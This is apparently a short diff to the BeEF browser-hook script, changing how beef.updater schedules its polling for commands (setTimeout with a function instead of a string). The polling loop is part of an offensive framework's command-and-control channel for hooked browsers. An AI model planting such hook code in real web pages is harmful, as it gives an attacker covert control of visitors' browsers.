@@ -47,9 +47,8 @@ beef.updater = {
 				this.get_commands();    /*Polling*/
 			}
 		}
-
-      // ( typeof beef.websocket === "undefined")
-		setTimeout("beef.updater.check();", beef.updater.xhr_poll_timeout);
+        /* The following gives a stupid syntax error in IE, which can be ignored*/
+        setTimeout(function(){beef.updater.check()}, beef.updater.xhr_poll_timeout);
 	},
 	
     /**
